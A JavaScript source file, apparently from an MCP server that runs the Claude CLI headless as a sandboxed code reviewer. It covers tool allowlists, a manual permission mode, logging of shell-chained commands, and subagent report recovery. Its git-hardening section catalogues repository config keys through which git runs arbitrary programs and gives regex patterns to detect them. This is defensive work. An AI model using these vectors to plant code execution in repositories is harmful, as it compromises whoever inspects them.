    // costs nothing extra and lets us report shell-chained commands that the
    // permission rules could not block, instead of hoping none happened.
    if (flags.streamJson) args.push("--output-format", "stream-json", "--verbose");
    else args.push("--output-format", "json");
    if (effort && flags.effort) args.push("--effort", effort);
    if (appendSystemPrompt) args.push("--append-system-prompt", appendSystemPrompt);
    if (allowedTools.length) args.push("--allowedTools", allowedTools.join(" "));
    if (disallowedTools.length) args.push("--disallowedTools", disallowedTools.join(" "));
    if (model) args.push("--model", model);
    if (typeof maxBudgetUsd === "number" && maxBudgetUsd > 0 && flags.budget) {
      args.push("--max-budget-usd", String(maxBudgetUsd));
    }
    if (resumeSessionId) args.push("--resume", resumeSessionId);
    if (flags.settingSources) args.push("--setting-sources", "user");
    if (flags.permissionMode) args.push("--permission-mode", "manual");
    // Anything the mode would prompt about is denied outright. In headless
    // --print there is no host to answer a prompt, so this makes "manual" mean
    // what it says instead of leaving the decision to whatever fallback applies.
    if (flags.permissionPrompts) args.push("--permission-prompts", "none");
    if (guardSettings) args.push("--settings", guardSettings);

    // The abort check at the top ran before argv was built; re-check immediately
    // before spawn. A cancel landing inside that window would otherwise still
    // fork a real claude process (and its first network round-trip bills) before
    // the onAbort killTree below takes effect.
    if (signal?.aborted) {
      guardSettingsInFlight.delete(guardSettings);
      removeGuardSettings(guardSettings);
      resolve({ ok: false, json: null, stdout: "", stderr: "", timedOut: false, cancelled: true, exitCode: null, durationMs: 0 });
      return;
    }

    let child;
    try {
      child = spawn(cmd, args, {
        cwd: repoPath,
        // The guard needs the repo root to scope Edit/Write/Read to the tree
        // under review; without it those tools would be blocked outright.
        env: { ...buildClaudeEnv(), CLAUDE_REVIEW_REPO_ROOT: repoPath },
        stdio: ["pipe", "pipe", "pipe"],
        windowsHide: true,
        detached: !IS_WIN, // own process group on unix so killTree can take the whole tree
      });
    } catch (err) {
      guardSettingsInFlight.delete(guardSettings);
      removeGuardSettings(guardSettings);
      resolve({ ok: false, json: null, stdout: "", stderr: String(err?.message || err), timedOut: false, cancelled: false, exitCode: null, durationMs: 0, spawnError: String(err?.message || err) });
      return;
    }
    liveChildren.add(child);
    // The guard file stays marked in-flight until the child EXITS (finish()
    // below deletes the mark and the file). Releasing it when spawn() returns
    // was wrong: spawn returns after fork/exec, while claude reads --settings
    // later during its own startup — a concurrent claude_review_env could
    // delete the file inside that window and the run would execute unguarded
    // while the report still claimed hardening. finish() is the one place that
    // unmarks, and the spawn-failure path above unmarks on its own.

    const started = Date.now();
    const soChunks = [];
    let soBytes = 0;
    let stdoutTruncated = false;
    const seChunks = [];
    let seBytes = 0;
    let stderrTruncated = false;
    let timedOut = false;
    let cancelled = false;
    let settled = false;
    // 'exit' (the child itself is done) is watched separately from 'close' (its
    // stdio pipes are closed). A descendant that inherited the pipes can delay or
    // prevent 'close' forever, so exit is what proves the run's work is complete;
    // the values are kept here so the deadline can settle with the REAL status
    // instead of a fake timeout (P1-9).
    let exited = false;
    let exitedCode = null;
    let exitedSignal = null;
    let drainTimer = null;

    // stream-json puts the `result` event LAST, so a raw buffer truncated at
    // MAX_STREAM_BYTES would lose exactly the line we need. Parse each line as
    // it arrives instead, and keep the Bash commands for the shell-chaining
    // report. Subagent activity (Agent/Task dispatches, their results, async
    // task_notification completions and the model tags) IS forwarded to the
    // parent stream by claude 2.1+ — collect it so the reviewer reports and
    // the model provenance reach the caller.
    let resultEvent = null;
    const bashCommands = [];
    const agentDispatches = [];
    const toolNames = new Map(); // tool_use id -> tool name (Agent/Task/Monitor/…)
    const taskNotifications = new Map();
    const workflowDispatches = [];
    const notifiedReports = new Map(); // tool_use id -> the record emitted for it
    const mainModels = new Set();
    const subagentModels = new Set();
    // Every finished subagent is persisted the moment it lands — one JSONL line
    // per subagent — so a 429 / budget halt / kill / server death cannot lose
    // work the tokens already paid for. The same record goes to onSubagentReport
    // so a caller polling the job sees the fleet fill up live.
    let subagentsFile = null;
    let subagentSeq = 0;
    const subagentRecords = [];
    const dispatchOutputFiles = new Map();
    const openSubagentsFile = () => {
      if (subagentsFile) return subagentsFile;
      const dir = subagentsDir || path.join(os.tmpdir(), "cc-code-review");
      fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
      subagentsFile = path.join(dir, `subagents-${process.pid}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}.jsonl`);
      activeSubagentFiles.add(subagentsFile);
      return subagentsFile;
    };
    const appendRecord = (record) => {
      try {
        // 0600 like the run logs: the reports quote the reviewed code.
        fs.appendFileSync(openSubagentsFile(), JSON.stringify(record) + "\n", { mode: 0o600 });
      } catch { /* persistence is best-effort; the in-memory record still stands */ }
    };
    const emitSubagent = (rec) => {
      const prev = notifiedReports.get(rec.id);
      if (prev) {
        // A task_notification is authoritative for its dispatch: a launch ack
        // misread as a sync report (an older CLI shape) must not suppress the
        // real report that arrives later. Any other duplicate is ignored.
        if (!(rec.authoritative && !prev.authoritative)) return;
        Object.assign(prev, {
          report: rec.report, status: rec.status, async: rec.async,
          partial: rec.partial, recovery: rec.recovery,
          outputFile: rec.outputFile || prev.outputFile,
        });
        // The JSONL is an append-only journal, so the correction is appended
        // as its own line (same seq) rather than rewriting the file.
        appendRecord({ ...prev, supersedes: true });
        return;
      }
      const record = { seq: ++subagentSeq, ts: new Date().toISOString(), ...rec };
      delete record.authoritative;
      subagentRecords.push(record);
      notifiedReports.set(rec.id, record);
      appendRecord(record);
      // Second argument: the JSONL path, so a polling client can tail it.
      try { onSubagentReport?.(record, subagentsFile); } catch { /* a throwing listener must not kill the run */ }
    };
    let soPartial = Buffer.alloc(0);
    let lastAssistantText = "";
    const ingest = (line) => {
      if (!line.startsWith("{")) return;
      let obj;
      try { obj = JSON.parse(line); } catch { return; }
      const facts = streamEventFacts(obj);
      if (facts.result) { resultEvent = facts.result; return; }
      // A forked slash command answers with model "<synthetic>" and leaves the
      // result event empty: keep the text so the report is not lost.
      if (facts.assistantText) lastAssistantText = facts.assistantText;
      if (facts.bashCommands) bashCommands.push(...facts.bashCommands);
      if (facts.toolUses) for (const t of facts.toolUses) toolNames.set(t.id, t.name);
      if (facts.agentDispatches) agentDispatches.push(...facts.agentDispatches);
      if (facts.agentResults) for (const r of facts.agentResults) {
        // An async launch ack carries the agent's transcript path — remember it
        // for the recovery pass if this agent never reports. The tool_result TEXT
        // itself is deliberately not retained (R-11): nothing ever read it back,
        // and one entry per tool_result pinned every multi-MB diff for the whole
        // run. The durable record is the per-subagent JSONL below.
        if (r.ack?.outputFile) dispatchOutputFiles.set(r.id, r.ack.outputFile);
      }
      const n = facts.taskNotification;
      if (n) {
        taskNotifications.set(n.toolUseId, n);
        if (n.outputFile) dispatchOutputFiles.set(n.toolUseId, n.outputFile);
      }
      if (facts.workflowDispatches) workflowDispatches.push(...facts.workflowDispatches);
      if (facts.model) (facts.model.subagent ? subagentModels : mainModels).add(facts.model.model);
      // Not every background task is a reviewer: 2.1.x also runs `Monitor`
      // tasks, whose notifications ("… stream ended") are not reports. Only an
      // id we know belongs to another tool is filtered — an id we have not seen
      // (truncated stream) is still accepted, because dropping a real report is
      // worse than keeping one extra.
      const owner = n ? toolNames.get(n.toolUseId) : null;
      const reviewerTask = !n || !owner || owner === "Agent" || owner === "Task";
      // One sub finished -> one durable record, right now, not at the end.
      if (n && reviewerTask) {
        const d = agentDispatches.find((x) => x.id === n.toolUseId);
        // A stopped/failed notification can carry an EMPTY summary (the agent
        // was killed before it wrote one). Its transcript still exists — fall
        // back to the tail of output_file instead of recording an empty report.
        let report = n.report;
        let partial, recovery;
        if (!report) {
          // An empty summary with no outputFile of its own still has the ack's
          // transcript path — audit F1: both recovery sources must be tried.
          const rec = recoverReportFromTranscript(n.outputFile || dispatchOutputFiles.get(n.toolUseId));
          if (rec) { report = rec.report; partial = true; recovery = "output_file"; }
        }
        emitSubagent({
          id: n.toolUseId, description: d?.description ?? "", subagentType: d?.subagentType ?? "",
          async: true, status: n.status, report, outputFile: n.outputFile, partial, recovery,
          authoritative: true,
        });
      } else if (!n && facts.agentResults) {
        for (const r of facts.agentResults) {
          // Launch ack (strict or loose shape): the report comes later, via a
          // task_notification or the transcript recovery pass.
          if (r.ack || looksLikeLaunchAck(r.text)) continue;
          const d = agentDispatches.find((x) => x.id === r.id);
          if (!d) continue; // not a subagent dispatch (some other tool result)
          emitSubagent({
            id: r.id, description: d.description, subagentType: d.subagentType,
            async: false, status: "completed", report: r.text,
          });
        }
      }
    };

    child.stdout.on("data", (d) => {
      if (soBytes < MAX_STREAM_BYTES) {
        const room = MAX_STREAM_BYTES - soBytes;
        soChunks.push(d.length > room ? d.subarray(0, room) : d); // keep the prefix, not whole-chunk loss
        soBytes += Math.min(d.length, room);
        if (d.length > room) stdoutTruncated = true;
      } else {
        stdoutTruncated = true;
      }
      if (!flags.streamJson) return;
      let buf = soPartial.length ? Buffer.concat([soPartial, d]) : d;
      let idx;
      while ((idx = buf.indexOf(0x0a)) >= 0) {
        const line = buf.subarray(0, idx).toString("utf8").trim();
        buf = buf.subarray(idx + 1);
        if (line) ingest(line);
      }
      // An unterminated multi-MB line (corrupt stream) would otherwise grow
      // unboundedly with per-chunk Buffer.concat (O(n^2)). Drop it: no valid
      // stream-json event is that large.
      soPartial = buf.length > 4 * 1024 * 1024 ? Buffer.alloc(0) : buf;
    });
    child.stderr.on("data", (d) => {
      if (seBytes >= MAX_STREAM_BYTES) { stderrTruncated = true; return; }
      const room = MAX_STREAM_BYTES - seBytes;
      seChunks.push(d.length > room ? d.subarray(0, room) : d);
      seBytes += Math.min(d.length, room);
      if (d.length > room) stderrTruncated = true;
    });

    const timer = setTimeout(() => {
      // The child already exited: the work is done and only a descendant holding
      // the inherited stdio keeps 'close' from firing. Settle with the real exit
      // status instead of throwing a complete, paid-for report away as timedOut.
      // The short drain lets a final `result` line still sitting in the pipe be
      // ingested before finish() destroys the streams.
      if (exited) {
        drainTimer = setTimeout(() => finish(exitedCode, exitedSignal), 200);
        return;
      }
      timedOut = true;
      killTree(child);
    }, timeoutMs);

    const onAbort = () => {
      if (!timedOut) cancelled = true; // a timeout that raced with the abort keeps its own label
      killTree(child);
    };
    signal?.addEventListener("abort", onAbort, { once: true });

    // If killTree itself fails to reap the child (AV interference, hung driver...),
    // force-settle so the MCP call never pends forever.
    const failsafe = setTimeout(() => {
      try { child.kill("SIGKILL"); } catch { /* already dead */ }
      finish(-1, "SIGKILL");
    }, timeoutMs + 20_000);

    function finish(code, signalName) {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      clearTimeout(failsafe);
      if (drainTimer) clearTimeout(drainTimer);
      signal?.removeEventListener("abort", onAbort);
      liveChildren.delete(child);
      // The run is settled, so drop our ends of the pipes: a descendant that
      // inherited them can otherwise keep 'close' pending forever (and the fds
      // alive) even after the result was resolved (P1-9). Everything already read
      // was captured in soChunks/seChunks; destroy() after EOF/close is a no-op.
      try { child.stdout?.destroy(); } catch { /* already closed */ }
      try { child.stderr?.destroy(); } catch { /* already closed */ }
      guardSettingsInFlight.delete(guardSettings); // final unmark point (see the mark site)
      removeGuardSettings(guardSettings);
      // Recovery pass: a subagent the parent never heard from (killed by a 429 /
      // budget halt / timeout, or its notification lost to stream truncation)
      // still left its work in the transcript file named by its launch ack or
      // notification. Salvage the tail so the tokens it spent are not wasted.
      for (const d of agentDispatches) {
        const recorded = notifiedReports.get(d.id);
        if (recorded) {
          // Audit F1: an agent that notified with an EMPTY summary and no
          // outputFile of its own never reaches the transcript otherwise — the
          // ack's transcript still holds its paid-for tail.
          if (!recorded.report) {
            const rec = recoverReportFromTranscript(recorded.outputFile || dispatchOutputFiles.get(d.id));
            if (rec) {
              Object.assign(recorded, {
                report: rec.report, partial: true, recovery: "output_file",
                status: recorded.status || "stopped",
                outputFile: recorded.outputFile || dispatchOutputFiles.get(d.id),
              });
              // The JSONL is an append-only journal: the correction is its own line.
              appendRecord({ ...recorded, supersedes: true });
            }
          }
          continue;
        }
        const recovered = recoverReportFromTranscript(dispatchOutputFiles.get(d.id));
        emitSubagent({
          id: d.id, description: d.description, subagentType: d.subagentType,
          async: !!dispatchOutputFiles.get(d.id), status: recovered ? "stopped" : "unknown",
          report: recovered?.report ?? "",
          // partial means "recovered from a transcript", not "no data at all".
          partial: !!recovered,
          outputFile: dispatchOutputFiles.get(d.id),
          recovery: recovered ? "output_file" : "none",
        });
      }
      let stdout = Buffer.concat(soChunks).toString("utf8");
      let stderr = Buffer.concat(seChunks).toString("utf8");
      if (stdoutTruncated) stderr += `\n[cc-code-review] stdout exceeded ${MAX_STREAM_BYTES} bytes and was truncated`;
      if (stderrTruncated) stderr += `\n[cc-code-review] stderr exceeded ${MAX_STREAM_BYTES} bytes and was truncated`;
      // Declared BEFORE the signal-hint block below uses it. Keeping this line
      // after that block was a TDZ bug: on unix every cancelled run or
      // Gatekeeper SIGKILL threw "Cannot access 'wasCancelled' before
      // initialization" out of this close listener, crashing the whole server.
      const wasCancelled = cancelled && signal?.aborted === true && !timedOut;
      if (!IS_WIN && code === null && signalName && !timedOut && !wasCancelled) {
        // A signal we did not send (our own kills arrive as timedOut/cancelled):
        // on macOS this is almost always Gatekeeper killing a freshly installed
        // native binary. Name the actual path so the hint is copy-pasteable.
        const hints = {
          SIGKILL: "killed by SIGKILL",
          SIGILL: "killed by SIGILL (illegal instruction — usually a quarantined/corrupted binary, or an x86_64-only binary on Apple Silicon with no Rosetta: check `file <path>` / `softwareupdate --install-rosetta`)",
          SIGTRAP: "killed by SIGTRAP (usually Gatekeeper refusing an unsigned binary)",
          SIGABRT: "aborted (SIGABRT — often a missing/incompatible runtime library)",
        };
        const what = hints[signalName];
        if (what && process.platform === "darwin") {
          stderr += `\n[cc-code-review] claude (${cli.path}) ${what} — possibly Gatekeeper/quarantine on a freshly installed native binary: ` +
            `run \`claude --version\` once in a terminal (or \`xattr -dr com.apple.quarantine ${cli.path}\`) and retry`;
        } else if (what) {
          stderr += `\n[cc-code-review] claude (${cli.path}) ${what}`;
        }
      }
      const json = resultEvent || parseResultJson(stdout);
      // A forked slash command (/code-review) reports num_turns 0 and an empty
      // result — its answer arrives as a synthetic assistant message. Without
      // this the native pipeline would return a successful run with no report.
      if (json && !json.result && lastAssistantText) json.result = lastAssistantText;
      // The journal belongs to THIS run: once the run settles, retention (the
      // 20-file prune and the 2h sweep) may reclaim it again. Leaving the path
      // in the set would pin it for the life of the server process.
      if (subagentsFile) activeSubagentFiles.delete(subagentsFile);
      resolve({
        ok: !wasCancelled && !timedOut && code === 0 && !!json,
        json,
        stdout,
        stderr,
        bashCommands,
        // Reviewer subagents as dispatched, paired with the final report each
        // one handed back (the tool_result whose id matches its dispatch).
        agentDispatches,
        // The incremental records (one per finished subagent, in completion
        // order, including partials recovered from output_file). The old
        // pairing map is kept only for CLIs that emit neither shape.
        agentReports: subagentRecords.map((r) => ({
          id: r.id,
          description: r.description,
          subagentType: r.subagentType,
          report: r.report,
          status: r.status,
          async: r.async || undefined,
          partial: r.partial || undefined,
          recovery: r.recovery || undefined,
          outputFile: r.outputFile || undefined,
        })),
        subagentsFile,
        // Model tags the session actually reported, split parent vs subagent.
        mainModels: [...mainModels],
        subagentModels: [...subagentModels],
        unrecognizedModels: parseUnrecognizedModels(stderr),
        workflowDispatches: [...workflowDispatches],
        timedOut,
        cancelled: wasCancelled,
        exitCode: code,
        // The signal (SIGTERM/SIGKILL/...) when the CLI died abnormally; null on a
        // clean exit. index.js needs it to tell "finished" from "killed after
        // printing a result" (audit P2-7).
        signal: signalName || null,
        durationMs: Date.now() - started,
      });
    }

    child.on("error", (err) => {
      seChunks.push(Buffer.from(`\n[spawn error] ${err?.message || err}`));
      finish(-1);
    });
    // 'exit' fires when the CHILD is done, regardless of who still holds its
    // stdio pipes; it is the event that proves the run finished (P1-9). Reap the
    // group here so the descendants that would hold those pipes do not survive
    // the run — this, not 'close', is what lets the call settle promptly.
    child.on("exit", (code, signalName) => {
      exited = true;
      exitedCode = code;
      exitedSignal = signalName;
      reapExitedGroup(child);
    });
    child.on("close", (code, signalName) => finish(code, signalName));

    child.stdin.on("error", () => { /* EPIPE if claude dies early; close handler reports it */ });
    // With promptViaArgv the prompt already travelled in argv; closing stdin
    // immediately keeps the CLI from waiting on a prompt it will not read.
    if (promptViaArgv) child.stdin.end();
    else { child.stdin.write(prompt, "utf8"); child.stdin.end(); }
  });
}

/**
 * The reviewed repository controls its own git configuration, and git happily
 * EXECUTES programs from it: `core.fsmonitor`, `diff.<driver>.command`,
 * `diff.<driver>.textconv` and `diff.external` all run a command the repo chose.
 * Since every allowlisted read command (`git status`, `git diff`, `git log`,
 * `git show`, `git blame`) can trigger one of those, the allowlist alone is not
 * a code-execution boundary — a repo that sets `core.fsmonitor` gets arbitrary
 * code execution the moment anyone runs `git status` in it. `--setting-sources
 * user` does not help: that only blocks `.claude/settings.json`, not `.git/config`.
 *
 * So every git spawn this server makes carries these overrides. A `-c` on the
 * command line beats every config file, including the repo's own, and the env
 * vars cut off the system/global config and the pager and credential helpers.
 */
export const GIT_HARDENING_ARGS = [
  "-c", "core.fsmonitor=",
  "-c", "diff.external=",
  "-c", "interactive.diffFilter=",
  "-c", "core.pager=cat",
  "-c", "core.editor=",
  "-c", "core.sshCommand=",
  "-c", "credential.helper=",
  "-c", "gpg.program=",
  "-c", "merge.tool=",
  "-c", "core.hooksPath=",
  "-c", "protocol.ext.allow=never",
];

/** git spawn options shared by every git call this server makes. */
let gitEmptyHome;
export function gitSpawnOpts(cwd, extraEnv = {}) {
  if (!gitEmptyHome) {
    try {
      gitEmptyHome = fs.mkdtempSync(path.join(os.tmpdir(), "cc-code-review-git-"));
    } catch {
      gitEmptyHome = os.tmpdir(); // better than nothing: still no ~/.gitconfig
    }
  }
  const globalConfig = path.join(gitEmptyHome, ".gitconfig-empty");
  try { fs.writeFileSync(globalConfig, "", { mode: 0o600 }); } catch { /* best effort */ }
  return {
    cwd,
    timeout: 15000,
    windowsHide: true,
    // default 1MB explodes on repos with many untracked files (porcelain > 1MB),
    // silently disabling fix verification and misdiagnosing gitPreflight
    maxBuffer: 64 * 1024 * 1024,
    env: {
      ...buildClaudeEnv(),
      ...extraEnv,
      HOME: gitEmptyHome,
      USERPROFILE: gitEmptyHome,
      GIT_CONFIG_NOSYSTEM: "1",
      GIT_ATTR_NOSYSTEM: "1",
      GIT_TERMINAL_PROMPT: "0",
      GIT_CONFIG_GLOBAL: globalConfig,
    },
  };
}

/**
 * Degraded LINE-SCAN patterns — the fallback used only when git itself cannot
 * normalize a config file. repoRunsGitPrograms() (below) owns the design note
 * (why `-c` is not a boundary) and the primary `git config --list -z` path.
 *
 * Two passes, because neither alone is enough:
 *  - config keys whose VALUE is a command (fsmonitor/textconv/external/driver/
 *    hooksPath/command/clean/smudge/process) — fires even with no attributes file
 *  - a `.gitattributes` reference (`diff=x` / `filter=x`) whose driver is defined
 *    in the repo's own config — this is what makes a `process =` or `cachetextconv`
 *    driver actually active, and what a plain line scan of the config misses
 *
 * Only the repo's own files are read, so an ordinary LFS repo (filter defined in
 * the user's global config, not in `.git/config`) is not flagged.
 *
 * A line table cannot model case-insensitive names, quoting, comments, dotted
 * subsections or same-line section headers — which is exactly how core.sshCommand
 * slipped past command-equals (no word boundary before the capital C) and how
 * core.attributesFile matched nothing at all, while git executed both (P0-8,
 * P0-9). These patterns remain the DEGRADED fallback for a host without a usable
 * git, so they carry the same keys.
 */
const CONFIG_CMD_PATTERNS = [
  /\btextconv\s*=/i,
  /\bexternal\s*=/i,
  /\bdiffFilter\s*=/i,
  /\bdriver\s*=/i,
  /\bcommand\s*=/i,
  /\bprocess\s*=/i,
  /\bfilter\s*\.[\w.-]+\s*\.\s*(clean|smudge|process)\s*=/i,
  /\b(clean|smudge)\s*=/i,
  // P0-8: keys the old table could not see. core.sshCommand has no word
  // boundary before "Command", so it needs a boundary-free form; the rest of
  // the same family (pager / gitProxy / credential helper) executes a
  // repo-chosen program too. The normalized path above is primary — this is
  // only for hosts where git itself is unusable.
  /(^|[.\s])sshcommand\s*=/i,
  /(^|[.\s])gitproxy\s*=/i,
  /(^|[.\s])pager\s*=/i,
  // Round-2 scanner gap: the remaining config keys whose value git runs. `pager.<cmd>` is
  // per-SUBCOMMAND and therefore has a dot before the variable name (the plain
  // `pager\s*=` above only sees core.pager, which git ignores once a
  // subcommand-specific pager exists). core.askPass is executed to answer a
  // credential challenge, and sequence.editor when an interactive rebase opens
  // an editor — neither is reachable through the read allowlist today, but both
  // are execution surfaces the scanner must not leave blank.
  /(^|[.\s])askpass\s*=/i,
  /(^|[.\s])pager\s*\.\s*[\w-]+\s*=/i,
  /(^|[.\s])sequence\s*\.\s*editor\s*=/i,
  /\bhelper\s*=/i,
];
// `core.fsmonitor` is a command only when it is not a boolean (`true` uses git's
// built-in monitor and is harmless — and is neutralised by -c anyway).
const FSMONITOR_CMD = /\bfsmonitor\s*=\s*(.+)/i;
// `core.hooksPath` and `[include] path` are PATH-valued, not command-valued.
const HOOKS_PATH = /\bhooksPath\s*=\s*(.+)/i;
const INCLUDE_PATH = /^\s*path\s*=\s*(.+?)\s*$/i;
/**
 * Normalized-key tables. git config --list lowercases the section and the
 * variable name (a subsection keeps its spelling, which is why driver names are
 * compared case-insensitively below), so these are the spellings to match.
 */

/** Keys whose VALUE git executes. */
const CONFIG_EXEC_KEYS = new Set([
  "core.sshcommand",
  "core.fsmonitor",
  "core.pager",
  "core.gitproxy",
  "diff.external",
  // Round-2 scanner gap: a credential challenge runs core.askPass, and an interactive rebase
  // runs sequence.editor. The read allowlist does not reach the operations that
  // trigger them today, but "not reachable today" is not a boundary: both are
  // repo-controlled programs and the review must not run them by accident.
  "core.askpass",
  "sequence.editor",
]);
/**
 * `pager.<cmd>` (exactly one subcommand name, no further dots). git resolves
 * the pager for a subcommand from this key BEFORE falling back to core.pager, so
 * the hardened `-c core.pager=cat` does not neutralise it. A boolean value is
 * git's enable/disable form (false disables the pager, true uses the default
 * one) — not a program — so booleans stay inert, exactly like core.fsmonitor.
 */
const CONFIG_PAGER_KEY = /^pager\.[^.]+$/;
/** credential.helper, plain and in the credential.<url>.helper form. */
const CONFIG_CREDENTIAL_HELPER = /^credential(?:\..+)?\.helper$/;
/**
 * A NAMED driver's command (diff.<name>.textconv, filter.<name>.process, ...).
 * Not refused on sight: git runs a named driver only when an attributes file
 * references it — that cross-check is what keeps an unreferenced definition
 * inert (and what keeps an ordinary global-config LFS filter from flagging
 * every repo). diff.external has no name, so it is in CONFIG_EXEC_KEYS.
 */
const CONFIG_DRIVER_KEY = /^(diff|filter)\.(.+)\.(textconv|external|command|difffilter|clean|smudge|process)$/;
/** The old line table refused merge drivers; keep that behaviour. */
const CONFIG_MERGE_DRIVER = /^merge\..+\.driver$/;
/** core.attributesFile: a PATH, not a command — collected and scanned (P0-9). */
const CONFIG_ATTR_FILE_KEY = "core.attributesfile";
const CONFIG_HOOKS_PATH_KEY = "core.hookspath";
const CONFIG_INCLUDE_PATH_KEY = /^include(?:if\..+)?\.path$/;
const CONFIG_BOOLEAN = /^(true|false|1|0|yes|no|on|off)$/i;

/**
 * One already-validated config file's entries as GIT normalizes them.
 *
 * "git config --file <cfg> --no-includes --list -z" emits one key/value record
 * per entry (fields separated by a newline, records by NUL; a bare boolean key
 * has no newline and therefore no value) and accepts everything git accepts —
 * quoting, comments, case, dotted subsections, continuation lines and a section
 * header sharing its line with the first key. That is the point: the scan must
 * see keys the way git sees them, not the way a regex guesses. --no-includes
 * keeps the result scoped to the file repoConfigFiles() already validated and
 * labeled (it walked the include graph itself), so a finding can never be
 * attributed to the wrong file.
 *
 * Returns null when git is missing, times out, or refuses the file; the caller
 * then falls back to the line scan — degraded, never silent.
 */
function normalizedConfigEntries(file, repoPath) {
  let res;
  try {
    res = spawnSync("git", [...GIT_HARDENING_ARGS, "config", "--file", file, "--no-includes", "--list", "-z"], gitSpawnOpts(repoPath));
  } catch { return null; }
  if (!res || res.error || res.status !== 0 || !Buffer.isBuffer(res.stdout)) return null;
  const entries = [];
  for (const rec of res.stdout.toString("utf8").split("\0")) {
    if (!rec) continue;
    const nl = rec.indexOf("\n");
    entries.push(nl < 0
      ? { key: rec.toLowerCase(), value: null }
      : { key: rec.slice(0, nl).toLowerCase(), value: rec.slice(nl + 1) });
  }
  return entries;
}

/**
 * A Windows UNC path (`\\server\share\...`, and the forward-slash spelling
 * `//server/share` that the Win32 API accepts for the same namespace).
 *
 * This is checked BEFORE any fs call on purpose. fs.existsSync() against a UNC
 * path is a synchronous network round trip with no timeout: on Windows a dead
 * or firewalled server stalls it for ~21s, and a mounted POSIX network share can
 * do the same. This scan runs synchronously before the review spawns and there
 * is no timer that can fire while it blocks — the whole MCP server freezes. A
 * UNC target is also not provably inert: whether the share answers says nothing
 * about the program a live server would hand back. Callers therefore treat it
 * as live/unverifiable (refusal) and never probe it.
 */
function isUncPath(value) {
  const v = String(value || "").trim().replace(/^["']|["']$/g, "");
  return /^\\\\[^\\]/.test(v) || /^\/\/[^/]/.test(v);
}

/**
 * Can we PROVE this config value cannot execute on THIS machine?
 *
 * A repository cloned from (or copied via a full-folder copy from) another OS
 * routinely carries absolute paths that are dead here — e.g. a Mac developer's
 * `core.hooksPath = /Users/kent/Desktop/proj/.githooks` on Windows. A dead path
 * cannot run anything, so it is a note, not a refusal. The check must err
 * towards "live": only an absolute path that does not exist in either separator
 * form counts as dead. Bare commands (`sh -c ...`) resolve through PATH and
 * shells we do not fully model, so they stay refusals.
 */
function deadPathOnThisMachine(value, repoPath) {
  const v = String(value || "").trim().replace(/^["']|["']$/g, "");
  if (!v) return false;
  const isAbs = v.startsWith("/") || /^[a-zA-Z]:[\\/]/.test(v) || v.startsWith("\\\\");
  if (!isAbs) return false; // relative/bare: resolves against cwd/PATH — not provably dead
  // UNC paths are never "dead": an existsSync against a dead server stalls ~21s
  // per probe, and reachability of the share is not proof about the target.
  // isUncPath() also catches the `//server/share` spelling, which used to reach
  // the existsSync calls below just because it starts with "/". The line-scan
  // fallback hands over RAW config text, where git escapes each backslash as
  // \\ (`\\\\server\share`), so detect the unescaped spelling too — the
  // probe must never see either form.
  if (isUncPath(v) || isUncPath(v.replace(/\\\\/g, "\\"))) return false;
  // A drive-RELATIVE path (/x or \x) resolves against the REPO's drive for git,
  // not this server's cwd drive — anchor it there before probing.
  const anchored = /^[\\/][^\\/]/.test(v) && repoPath && /^[a-zA-Z]:/.test(repoPath)
    ? repoPath.slice(0, 2) + v : v;
  // H1: a path containing SPACES must not be truncated to its first token —
  // "C:\Program Files\t\watch.exe" truncated to "C:\Program" would look dead
  // while git happily executes the full path. Probe every prefix that ends at a
  // space boundary (longest first, then shorter): if ANY exists, it is live.
  const pieces = anchored.split(/\s+/);
  const prefixes = [];
  for (let i = pieces.length; i >= 1; i--) prefixes.push(pieces.slice(0, i).join(" "));
  try {
    for (const p of prefixes) {
      for (const cand of [p, p.replace(/"/g, "")]) {
        if (fs.existsSync(cand)) return false;
        const swapped = cand.replace(/[\\/]/g, (c) => (c === "/" ? "\\" : "/"));
        if (fs.existsSync(swapped)) return false;
      }
    }
  } catch { return false; }
  return true;
}

/** Extract the value side of a `key = value` config line (null when not one). */
const valueOf = (line, re) => {
  const m = re.exec(line);
  return m ? m[1] : null;
};

const isCmdLine = (line) => {
  const fm = FSMONITOR_CMD.exec(line);
  if (fm) return !/^(true|false|1|0|yes|no|on|off)$/i.test(fm[1].trim());
  const inc = INCLUDE_PATH.exec(line);
  if (inc) {
    const raw = inc[1].trim().replace(/^["']|["']$/g, "");
    return !!raw && !raw.startsWith("~/");
  }
  return CONFIG_CMD_PATTERNS.some((p) => p.test(line));
};

/**
 * Read one file whose CONTENT the repository controls, without letting that
 * content take the server down.
 *
 * A repository delivered as a zip (or a clone of one) can ship `.gitattributes`
 * or `.git/config` as a symlink to /dev/stdin, a FIFO, or /dev/zero: a plain
 * readFileSync then blocks the event loop forever (the MCP's stdin never closes,
 * so /dev/stdin never reaches EOF) or allocates without bound, and NO timeout can
 * fire while a synchronous read is stuck — the whole server freezes (P0-3).
 * Git's own attr code opens `.gitattributes` with O_NOFOLLOW, so only a PLAIN
 * file is repository content we can safely read in-process.
 *
 * `roots` is the tree the file must really live in (a string or a list). Both
 * sides are realpath'd because the roots may themselves contain symlinks (macOS
 * /tmp -> /private/tmp). That containment check is what stops an `[include] path`
 * from turning the scan into a reader of arbitrary files outside the repo.
 *
 * `followSymlink` is for the config family only: git itself follows a symlinked
 * .git pointer file, .git/config, an [include] target and .git/info/attributes —
 * all verified to execute a repo-chosen textconv — so refusing to follow those
 * would hand a zip-delivered repo a hiding place. The link target is still
 * required to be a REGULAR file inside an owning tree (never a FIFO/device), and
 * worktree .gitattributes is never followed because git opens that with
 * O_NOFOLLOW and a symlinked one is inert.
 *
 * Returns { text } when readable, { refusal } when the file exists but must be
 * rejected with a reason the caller surfaces (oversized), or null when it is not
 * repository-controlled content at all (missing / unreadable / FIFO / device /
 * link target that is not a regular file inside `roots`) — callers skip null
 * exactly like a missing file.
 */
const MAX_REPO_METADATA_BYTES = 1024 * 1024;
function readRepoFile(file, roots, { followSymlink = false } = {}) {
  let target = file;
  let st;
  try { st = fs.lstatSync(file); } catch { return null; }
  if (st.isSymbolicLink()) {
    // A symlink's target is attacker-chosen and can be a FIFO or a device with no
    // bounded-read guarantee, so it is only followed where git itself follows it
    // (see the doc above) — and then only to a regular file inside the owning tree.
    if (!followSymlink) return null;
    try { target = fs.realpathSync(file); } catch { return null; } // dangling / link loop
    try { st = fs.lstatSync(target); } catch { return null; }
  }
  if (!st.isFile()) return null;
  let real;
  try { real = fs.realpathSync(target); } catch { return null; }
  const rootList = Array.isArray(roots) ? roots : [roots];
  const inside = rootList.some((root) => {
    try {
